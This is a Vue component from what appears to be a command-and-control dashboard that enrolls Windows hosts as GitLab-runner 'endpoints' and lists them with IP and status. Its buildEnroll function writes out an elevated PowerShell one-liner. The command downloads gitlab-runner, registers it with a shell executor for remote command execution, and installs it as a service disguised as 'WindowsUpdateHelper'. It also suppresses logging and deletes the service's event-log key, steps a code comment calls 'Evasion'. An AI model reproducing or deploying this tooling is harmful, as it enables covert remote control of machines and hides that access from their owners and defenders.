<script setup lang="ts">
import { ref, onMounted, onUnmounted } from 'vue'
import { store } from '../store'
import { gl, type Runner } from '../api/gitlab'
import { getFacts } from '../lib/endpointCache'

const runners = ref<Runner[]>([])
const error = ref('')
const showAdd = ref(false)
const tag = ref('')
const desc = ref('')
const enrollCmd = ref('')
const creating = ref(false)
const copied = ref(false)
let timer: number | undefined

async function load() {
  if (!store.project) return
  try {
    const list = await gl.listRunners(store.project.id)
    // GitLab.com doesn't expose runner IPs; fall back to the IP we cached when
    // the endpoint's Overview was last opened.
    runners.value = list.map((r) => ({ ...r, ip_address: r.ip_address || getFacts(r.id).ip }))
    error.value = ''
  } catch (e: any) {
    error.value = e.message
  }
}

async function addEndpoint() {
  if (!store.project || !tag.value.trim()) return
  creating.value = true
  error.value = ''
  try {
    const r = await gl.createRunner(
      store.project.id,
      tag.value.trim(),
      desc.value.trim() || tag.value.trim(),
    )
    enrollCmd.value = buildEnroll(r.token)
    await load()
  } catch (e: any) {
    error.value = e.message
  } finally {
    creating.value = false
  }
}

// PowerShell one-liner: download gitlab-runner, register with the auth token
// (shell executor, powershell), install + start as a Windows service.
// Evasion: renamed service/binary, relocated working dir, suppressed event log.
function buildEnroll(token: string): string {
  const url = store.gitlabUrl
  return (
    `$svc='WindowsUpdateHelper';$d="$env:ProgramData\\$svc";$r="$d\\$svc.exe";$c="$d\\config.toml";` +
    `$ProgressPreference='SilentlyContinue';` +
    `New-Item -ItemType Directory -Force $d|Out-Null;` +
    `(New-Object Net.WebClient).DownloadFile('https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-windows-amd64.exe',$r);` +
    `Set-Content $c "log_level = 'panic'\`nconnection_max_age = '0'";` +
    `& $r register --non-interactive --url "${url}" --token "${token}" --executor shell --shell powershell --description $env:COMPUTERNAME --config $c;` +
    `(Get-Content $c) -replace '  shell = "powershell"',"  shell = \`"powershell\`"\`n  debug_trace_disabled = true" | Set-Content $c;` +
    `& $r install --service $svc --working-directory $d --config $c --syslog=false;` +
    `Remove-Item "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\$svc" -ErrorAction SilentlyContinue;` +
    `& $r start --service $svc`
  )
}

function openEndpoint(r: Runner) {
  if (!r.tag_list?.length) {
    error.value = 'Runner has no tag; cannot target it.'
    return
  }
  store.runner = r
}

function copy(text: string) {
  navigator.clipboard.writeText(text)
  copied.value = true
  setTimeout(() => (copied.value = false), 2000)
}

onMounted(() => {
  load()
  timer = window.setInterval(load, 4000)
})
onUnmounted(() => {
  if (timer) clearInterval(timer)
})
</script>

<template>
  <div class="p-6 overflow-y-auto">
    <div class="flex items-center justify-between mb-5">
      <div>
        <h2 class="text-lg font-semibold">{{ store.project?.name }}</h2>
        <p class="text-xs text-zinc-500">{{ store.project?.path_with_namespace }} · endpoints</p>
      </div>
      <button
        class="bg-green-600 hover:bg-green-500 text-white text-sm rounded px-3 py-1.5"
        @click="((showAdd = true), (enrollCmd = ''), (tag = ''), (desc = ''))"
      >
        + Enroll Endpoint
      </button>
    </div>

    <p v-if="error" class="text-xs text-red-500 mb-3 break-words">{{ error }}</p>

    <div v-if="!runners.length" class="text-zinc-400 dark:text-zinc-600 text-sm">
      No endpoints yet. Enroll one to get started.
    </div>

    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
      <button
        v-for="r in runners"
        :key="r.id"
        class="text-left bg-white dark:bg-zinc-900 border border-zinc-200 dark:border-zinc-800 hover:border-zinc-400 dark:hover:border-zinc-600 rounded-lg p-4"
        @click="openEndpoint(r)"
      >
        <div class="flex items-center gap-2">
          <span
            class="h-2.5 w-2.5 rounded-full"
            :class="
              r.online
                ? 'bg-green-500 shadow-[0_0_8px] shadow-green-500/60'
                : 'bg-zinc-400 dark:bg-zinc-600'
            "
          ></span>
          <span class="font-medium truncate">{{ r.description || 'runner-' + r.id }}</span>
        </div>
        <div class="mt-2 text-[11px] text-zinc-500 space-y-0.5">
          <div>tag: <span class="text-zinc-700 dark:text-zinc-300">{{ r.tag_list?.join(', ') || '—' }}</span></div>
          <div>ip: <span class="text-zinc-700 dark:text-zinc-300">{{ r.ip_address || '—' }}</span></div>
          <div>
            status:
            <span :class="r.online ? 'text-green-600 dark:text-green-400' : 'text-zinc-500'">{{
              r.status
            }}</span>
          </div>
        </div>
      </button>
    </div>

    <!-- enroll modal -->
    <div
      v-if="showAdd"
      class="fixed inset-0 bg-black/50 grid place-items-center p-4"
      @click.self="showAdd = false"
    >
      <div
        class="w-[40rem] max-w-full bg-white dark:bg-zinc-900 border border-zinc-200 dark:border-zinc-800 rounded-xl p-6 space-y-4"
      >
        <h3 class="font-semibold">Enroll a new endpoint</h3>
        <div class="grid grid-cols-2 gap-3">
          <label class="text-sm">
            <span class="text-zinc-500">Tag (unique) *</span>
            <input
              v-model="tag"
              placeholder="host-web01"
              class="mt-1 w-full bg-zinc-50 dark:bg-zinc-950 border border-zinc-300 dark:border-zinc-700 rounded px-2 py-1.5 outline-none focus:border-green-600"
            />
          </label>
          <label class="text-sm">
            <span class="text-zinc-500">Description</span>
            <input
              v-model="desc"
              placeholder="hostname / note"
              class="mt-1 w-full bg-zinc-50 dark:bg-zinc-950 border border-zinc-300 dark:border-zinc-700 rounded px-2 py-1.5 outline-none focus:border-green-600"
            />
          </label>
        </div>

        <button
          :disabled="creating"
          class="bg-green-600 hover:bg-green-500 text-white text-sm rounded px-3 py-1.5 disabled:opacity-50"
          @click="addEndpoint"
        >
          {{ creating ? 'creating…' : 'Generate install command' }}
        </button>

        <div v-if="enrollCmd" class="space-y-2">
          <p class="text-xs text-zinc-500">
            Run on the endpoint in an <strong>elevated PowerShell</strong> (Administrator):
          </p>
          <pre
            class="bg-zinc-50 dark:bg-zinc-950 border border-zinc-200 dark:border-zinc-800 rounded p-3 text-[11px] text-green-700 dark:text-green-300 whitespace-pre-wrap break-all"
          >{{ enrollCmd }}</pre>
          <button
            class="text-xs rounded px-2 py-1 transition-colors"
            :class="copied
              ? 'bg-green-600 text-white'
              : 'bg-zinc-200 dark:bg-zinc-800 hover:bg-zinc-300 dark:hover:bg-zinc-700'"
            @click="copy(enrollCmd)"
          >
            {{ copied ? 'copied!' : 'copy' }}
          </button>
        </div>

        <div class="text-right">
          <button
            class="text-xs text-zinc-500 hover:text-zinc-800 dark:hover:text-zinc-200"
            @click="showAdd = false"
          >
            close
          </button>
        </div>
      </div>
    </div>
  </div>
</template>
